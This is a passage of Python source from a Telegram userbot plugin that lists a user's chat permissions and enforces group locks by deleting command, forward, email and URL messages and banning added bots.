            uembed_link = "โ" if result.participant.banned_rights.embed_links else "โ"
            ugpoll = "โ" if result.participant.banned_rights.send_polls else "โ"
            uadduser = "โ" if result.participant.banned_rights.invite_users else "โ"
            ucpin = "โ" if result.participant.banned_rights.pin_messages else "โ"
            uchangeinfo = "โ" if result.participant.banned_rights.change_info else "โ"
        except AttributeError:
            umsg = "โ" if chat_per.send_messages else "โ"
            umedia = "โ" if chat_per.send_media else "โ"
            usticker = "โ" if chat_per.send_stickers else "โ"
            ugif = "โ" if chat_per.send_gifs else "โ"
            ugamee = "โ" if chat_per.send_games else "โ"
            uainline = "โ" if chat_per.send_inline else "โ"
            uembed_link = "โ" if chat_per.embed_links else "โ"
            ugpoll = "โ" if chat_per.send_polls else "โ"
            uadduser = "โ" if chat_per.invite_users else "โ"
            ucpin = "โ" if chat_per.pin_messages else "โ"
            uchangeinfo = "โ" if chat_per.change_info else "โ"
        output += f"{_format.mentionuser(user.first_name ,user.id)} **permissions in {event.chat.title} chat are **\n"
        output += f"__Send Messages :__ {umsg}\n"
        output += f"__Send Media :__ {umedia}\n"
        output += f"__Send Stickers :__ {usticker}\n"
        output += f"__Send Gifs :__ {ugif}\n"
        output += f"__Send Games :__ {ugamee}\n"
        output += f"__Send Inline bots :__ {uainline}\n"
        output += f"__Send Polls :__ {ugpoll}\n"
        output += f"__Embed links :__ {uembed_link}\n"
        output += f"__Add Users :__ {uadduser}\n"
        output += f"__Pin messages :__ {ucpin}\n"
        output += f"__Change Chat Info :__ {uchangeinfo}\n"
    await edit_or_reply(event, output)


@EITHON1.ar_cmd(incoming=True)
async def check_incoming_messages(event):  # sourcery no-metrics
    if not event.is_private:
        chat = await event.get_chat()
        admin = chat.admin_rights
        creator = chat.creator
        if not admin and not creator:
            return
    peer_id = event.chat_id
    if is_locked(peer_id, "commands"):
        entities = event.message.entities
        is_command = False
        if entities:
            for entity in entities:
                if isinstance(entity, types.MessageEntityBotCommand):
                    is_command = True
        if is_command:
            try:
                await event.delete()
            except Exception as e:
                await event.reply(
                    "I don't seem to have ADMIN permission here. \n`{}`".format(str(e))
                )
                update_lock(peer_id, "commands", False)
    if is_locked(peer_id, "forward") and event.fwd_from:
        try:
            await event.delete()
        except Exception as e:
            await event.reply(
                "I don't seem to have ADMIN permission here. \n`{}`".format(str(e))
            )
            update_lock(peer_id, "forward", False)
    if is_locked(peer_id, "email"):
        entities = event.message.entities
        is_email = False
        if entities:
            for entity in entities:
                if isinstance(entity, types.MessageEntityEmail):
                    is_email = True
        if is_email:
            try:
                await event.delete()
            except Exception as e:
                await event.reply(
                    "I don't seem to have ADMIN permission here. \n`{}`".format(str(e))
                )
                update_lock(peer_id, "email", False)
    if is_locked(peer_id, "url"):
        entities = event.message.entities
        is_url = False
        if entities:
            for entity in entities:
                if isinstance(
                    entity, (types.MessageEntityTextUrl, types.MessageEntityUrl)
                ):
                    is_url = True
        if is_url:
            try:
                await event.delete()
            except Exception as e:
                await event.reply(
                    "I don't seem to have ADMIN permission here. \n`{}`".format(str(e))
                )
                update_lock(peer_id, "url", False)


@EITHON1.on(events.ChatAction())
async def _(event):
    if not event.is_private:
        chat = await event.get_chat()
        admin = chat.admin_rights
        creator = chat.creator
        if not admin and not creator:
            return
    # check for "lock" "bots"
    if not is_locked(event.chat_id, "bots"):
        return
    # bots are limited Telegram accounts,
    # and cannot join by themselves
    if event.user_added:
        users_added_by = event.action_message.sender_id
        is_ban_able = False
        rights = types.ChatBannedRights(until_date=None, view_messages=True)
        added_users = event.action_message.action.users
        for user_id in added_users:
            user_obj = await event.client.get_entity(user_id)
            if user_obj.bot:
                is_ban_able = True
                try:
                    await event.client(
                        functions.channels.EditBannedRequest(
                            event.chat_id, user_obj, rights
                        )
                    )
                except Exception as e:
                    await event.reply(
                        "I don't seem to have ADMIN permission here. \n`{}`".format(
                            str(e)
                        )
                    )
                    update_lock(event.chat_id, "bots", False)
                    break
        if BOTLOG and is_ban_able:
            ban_reason_msg = await event.reply(
                "!warn [user](tg://user?id={}) Please Do Not Add BOTs to this chat.".format(
                    users_added_by
                )
            )
#THIS FILE WRITTEN BY  @TTTLL0
